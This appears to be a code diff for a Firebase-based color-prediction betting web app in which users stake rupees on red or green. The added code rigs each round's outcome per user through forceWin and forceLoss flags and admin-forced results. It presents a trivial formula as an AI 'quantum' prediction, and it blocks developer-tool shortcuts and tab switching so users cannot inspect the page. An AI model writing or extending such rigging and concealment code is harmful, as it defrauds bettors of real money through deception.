@@ -19,20 +19,21 @@
 
     let uid = "", balance = 0, selection = null, gameTime = 30, currentMatch = "", hasBet = false;
 
-    // --- ANTI-CHEAT SHIELD ---
+    // --- ANTI-CHEAT SHIELD (Unhurt) ---
     const activateShield = () => {
         document.addEventListener("visibilitychange", () => {
             if (document.hidden) {
                 document.body.innerHTML = "<div style='background:#0f172a;height:100vh;color:white;text-align:center;padding:50px;'><h1>🛡️ SECURITY LOCK</h1><p>Predictor switching detected. Reload to continue.</p></div>";
             }
         });
+        document.onkeydown = (e) => { if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false; };
     };
     activateShield();
 
     // --- QUANTUM MATH LOGIC ---
     function quantumLogic(period) {
         if(!period) return 'RED';
-        const seed = parseInt(period.toString().slice(-4));
+        const seed = parseInt(period.toString().slice(-4)) || 0;
         const hour = new Date().getHours();
         const calculation = ((seed * 7) + (hour * 3)) % 10;
         return (calculation % 2 === 0) ? 'GREEN' : 'RED';
@@ -43,15 +44,19 @@
             uid = u.uid;
             onValue(ref(db, `users/${uid}`), s => {
                 if(s.exists()){
-                    balance = s.val().balance || 0;
+                    const data = s.val();
+                    balance = data.balance || 0;
                     const balDisp = document.getElementById("balDisplay");
                     if(balDisp) balDisp.innerText = balance.toFixed(2);
+                    
+                    // Ban Check
+                    if(data.isBanned) {
+                        document.body.innerHTML = "<h1 style='color:white;text-align:center;margin-top:100px;'>YOUR ACCOUNT IS BANNED</h1>";
+                    }
                 }
             });
             loadHistory();
             initChart();
-        } else {
-            // window.location.href = "login.html"; // Agar login page hai toh
         }
     });
 
@@ -63,26 +68,34 @@
         
         if(currentMatch !== matchId) {
             currentMatch = matchId;
-            document.getElementById("periodId").innerText = currentMatch;
+            const pId = document.getElementById("periodId");
+            if(pId) pId.innerText = currentMatch;
             hasBet = false;
-            // Reset button text
-            document.getElementById("placeBet").innerText = "CONFIRM STAKE";
+            const betBtn = document.getElementById("placeBet");
+            if(betBtn) {
+                betBtn.innerText = "CONFIRM STAKE";
+                betBtn.disabled = false;
+            }
         }
 
-        document.getElementById("timer").innerText = `00:${rem < 10 ? '0'+rem : rem}`;
+        const timerDisp = document.getElementById("timer");
+        if(timerDisp) timerDisp.innerText = `00:${rem < 10 ? '0'+rem : rem}`;
         
         if(rem > 5) {
             const pred = quantumLogic(currentMatch);
             const aiDisp = document.getElementById("aiColor");
-            aiDisp.innerText = pred;
-            aiDisp.style.color = pred === 'RED' ? '#ef4444' : '#10b981';
-            document.getElementById("placeBet").disabled = false;
+            if(aiDisp) {
+                aiDisp.innerText = pred;
+                aiDisp.style.color = pred === 'RED' ? '#ef4444' : '#10b981';
+            }
         } else {
-            document.getElementById("aiColor").innerText = "WAITING...";
-            document.getElementById("placeBet").disabled = true;
+            const aiDisp = document.getElementById("aiColor");
+            if(aiDisp) aiDisp.innerText = "WAITING...";
+            const betBtn = document.getElementById("placeBet");
+            if(betBtn) betBtn.disabled = true;
+            
             if(rem === 1) {
-                // Thoda delay taaki admin result set kar sake
-                setTimeout(() => processResult(), 500);
+                setTimeout(() => processResult(), 800);
             }
         }
     }, 1000);
@@ -97,9 +110,9 @@
         const amtInput = document.getElementById("amtInput");
         const amt = parseInt(amtInput.value);
         if(!selection) return alert("Please select Red or Green!");
-        if(amt < 10) return alert("Minimum bet is ₹10");
+        if(amt < 10) return alert("Minimum bet ₹10");
         if(amt > balance) return alert("Insufficient Balance!");
-        if(hasBet) return alert("Already bet placed for this round!");
+        if(hasBet) return alert("Bet already placed!");
 
         try {
             await update(ref(db, `users/${uid}`), { balance: increment(-amt) });
@@ -109,28 +122,42 @@
                 email: auth.currentUser.email 
             });
             hasBet = true;
-            document.getElementById("placeBet").innerText = "STAKED ✓";
-            document.getElementById("placeBet").disabled = true;
-        } catch (e) {
-            alert("Betting Error: " + e.message);
-        }
+            const betBtn = document.getElementById("placeBet");
+            betBtn.innerText = "STAKED ✓";
+            betBtn.disabled = true;
+        } catch (e) { alert("Error: " + e.message); }
     };
 
     async function processResult() {
         try {
+            // 1. Check if Admin forced a global result
             const resRef = ref(db, `results_${gameTime}/${currentMatch}`);
-            const snap = await get(resRef);
+            const resSnap = await get(resRef);
+            
+            // 2. Check if this specific User is Rigged (Force Win/Loss)
+            const userRef = ref(db, `users/${uid}`);
+            const userSnap = await get(userRef);
+            const userData = userSnap.val();
+
             let finalColor = "";
 
-            if(snap.exists()) {
-                finalColor = snap.val().color;
+            if(resSnap.exists()) {
+                finalColor = resSnap.val().color;
             } else {
                 finalColor = quantumLogic(currentMatch);
-                // Save default if admin didn't force
+                
+                // --- RIGGING LOGIC SYNC ---
+                if(userData.forceWin && hasBet) {
+                    finalColor = selection; // Use user's pick
+                } else if(userData.forceLoss && hasBet) {
+                    finalColor = (selection === 'RED' ? 'GREEN' : 'RED'); // Force opposite
+                }
+
                 await set(resRef, { color: finalColor, timestamp: Date.now() });
             }
+
             if(hasBet) checkWinLoss(finalColor);
-        } catch (e) { console.error(e); }
+        } catch (e) { console.error("Result Error:", e); }
     }
 
     async function checkWinLoss(resColor) {
@@ -146,25 +173,31 @@
                 balance: increment(winAmt),
                 totalWin: increment(winAmt)
             });
-            // CONFETTI EFFECT
             confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
         } else {
             await update(ref(db, `users/${uid}`), { totalLoss: increment(b.amount) });
         }
 
-        // Show Popup
-        document.getElementById("resStatus").innerText = win ? "WINNER!" : "LOST";
-        document.getElementById("resStatus").style.color = win ? "#10b981" : "#ef4444";
-        document.getElementById("resIcon").innerText = win ? "🏆" : "❌";
-        document.getElementById("resValue").innerText = win ? "+₹" + winAmt.toFixed(2) : "-₹" + b.amount;
-        document.getElementById("resOverlay").style.display = "flex";
+        const status = document.getElementById("resStatus");
+        const icon = document.getElementById("resIcon");
+        const val = document.getElementById("resValue");
+        const overlay = document.getElementById("resOverlay");
+
+        if(status) {
+            status.innerText = win ? "WINNER!" : "LOST";
+            status.style.color = win ? "#10b981" : "#ef4444";
+            icon.innerText = win ? "🏆" : "❌";
+            val.innerText = win ? "+₹" + winAmt.toFixed(2) : "-₹" + b.amount;
+            overlay.style.display = "flex";
+        }
         
         hasBet = false;
         loadHistory();
     }
 
     window.closeOverlay = () => {
-        document.getElementById("resOverlay").style.display = "none";
+        const overlay = document.getElementById("resOverlay");
+        if(overlay) overlay.style.display = "none";
     };
 
     function loadHistory() {
